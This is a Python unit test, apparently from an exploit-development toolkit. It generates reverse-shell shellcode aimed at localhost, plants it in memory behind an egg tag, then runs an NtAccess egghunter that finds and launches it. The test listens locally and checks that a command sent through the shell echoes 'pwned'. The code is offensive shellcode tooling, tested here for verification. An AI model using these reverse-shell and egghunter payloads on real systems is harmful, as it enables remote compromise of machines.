import random
import socket
import time
import unittest

from coder import egghunter, reverse_shell
from runner import load_shellcode, run_shellcode
from stones import assemble


def test_egghunter_with_reverse_shell(egghunter_generate):
    port = random.randint(49152, 65535)

    code = reverse_shell.generate(
        "127.0.0.1",
        port,
        bad_chars=b"\x00",
        exit_func=("ntdll.dll", "RtlExitUserThread"),
        debug=False,
    )

    shellcode = bytearray([0] * 8) + assemble(code)

    t1, t2, t3 = b"w00", b"tw0", b"0t"
    shellcode[0], shellcode[1], shellcode[2] = t1[0], t1[1], t1[2]
    shellcode[3], shellcode[4], shellcode[5] = t2[0], t2[1], t2[2]
    shellcode[6], shellcode[7] = t3[0], t3[1]

    load_shellcode(shellcode)
    for i in range(len(shellcode)):
        shellcode[i] = 0x0

    egghunter_code = egghunter_generate((t1 + t2 + t3).decode(), debug=False)
    egghunter_shellcode = assemble(egghunter_code)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("0.0.0.0", port))
        s.listen()

        ptr = load_shellcode(egghunter_shellcode)
        run_shellcode(ptr, wait=False)

        client_s, _ = s.accept()

    client_s.send(b"echo p^w^n^e^d\r\n")
    time.sleep(0.5)

    resp = client_s.recv(0x1000)
    client_s.send(b"exit\r\n")
    client_s.close()

    return b"pwned" in resp


class TestEgghunter(unittest.TestCase):
    def test_ntaccess_egghunter(self):
        result = test_egghunter_with_reverse_shell(egghunter.generate_ntaccess)
        self.assertTrue(result)

    # SEH egghunter could not be tested because SafeSEH is enabled in Python binary
    # def test_seh_egghunter(self):
    #     pass
